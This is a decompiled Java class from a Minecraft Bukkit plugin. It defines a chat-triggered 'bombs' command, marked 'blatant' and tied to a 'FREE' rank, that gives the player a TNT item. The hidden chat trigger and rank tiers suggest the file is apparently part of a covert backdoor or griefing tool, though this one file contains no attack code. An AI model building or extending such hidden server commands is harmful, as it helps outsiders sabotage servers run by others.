package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import org.bukkit.Material;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

@CommandInfo(
   name = "bombs",
   description = "Gives you a bomb.",
   blatant = true,
   rank = Rank.FREE,
   aliases = {"bomb"}
)
public class BombCommand extends AbstractCommand {
   public static ItemStack getBomb() {
      ItemStack var0 = new ItemStack(Material.TNT, 1);
      ItemMeta var1 = var0.getItemMeta();
      var1.setDisplayName("§8§kI§c Bomb §8§kI");
      var1.addItemFlags(ItemFlag.HIDE_ENCHANTS);
      var0.setItemMeta(var1);
      var0.addUnsafeEnchantment(Enchantment.DURABILITY, 69);
      return var0;
   }

   public BombCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      ChatUtil.sendChat(var1.getPlayer(), "&cRight click to throw the bomb.");
      var1.getPlayer().getInventory().addItem(getBomb());
   }
}
